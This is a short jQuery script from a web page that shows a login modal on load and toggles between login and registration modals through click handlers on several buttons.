    <script>
        $(window).load(function () {
            $('#myModal').show();
            $('#myModal').css('opacity', '1');
            $('#close').on('click', function () {
                $('#myModal').hide();
            });
            $('#login').on('click', function () {
                $('#myModal').show();
            });
            $('#fromuptoin').on('click', function () {
                $('#regModal').hide();
                $('#myModal').show();
            });
            $('#salem').on('click', function () {
                $('#regModal').show();
            });
            $('#salem').on('click', function () {
                $('#regModal').css('opacity', '1');
            });
            $('#close2').on('click', function () {
                $('#regModal').hide();
            });
            $('#fromintoup').on('click', function () {
                $('#myModal').hide();
                $('#regModal').show();
                $('#regModal').css('opacity', '1');
            });
        });
    </script>
